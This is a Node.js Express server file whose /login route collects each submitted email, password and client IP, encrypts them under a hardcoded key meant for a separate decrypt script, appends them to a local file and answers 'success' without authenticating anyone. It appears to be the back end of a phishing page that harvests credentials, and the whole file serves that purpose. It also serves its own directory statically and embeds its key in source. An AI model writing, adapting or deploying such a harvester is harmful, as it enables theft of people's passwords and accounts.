const express = require("express");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));

const SECRET_KEY = crypto
  .createHash("sha256")
  .update("my-secret-key") // MUST match decrypt.js
  .digest();

const ALGO = "aes-256-cbc";

function encrypt(text) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(ALGO, SECRET_KEY, iv);

    let encrypted = cipher.update(text, "utf8", "base64");
    encrypted += cipher.final("base64");

    return `${iv.toString("base64")}:${encrypted}`;
}

app.post("/login", (req, res) => {
    const userIP =
        req.headers["x-forwarded-for"] ||
        req.socket.remoteAddress ||
        "Unknown IP";

    const email = req.body.email;
    const password = req.body.password;

    const data = `email=${email}; password=${password}; ip=${userIP}`;

    const encrypted = encrypt(data);

    fs.appendFileSync("users.enc.txt", encrypted + "\n");

    res.send("success");
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
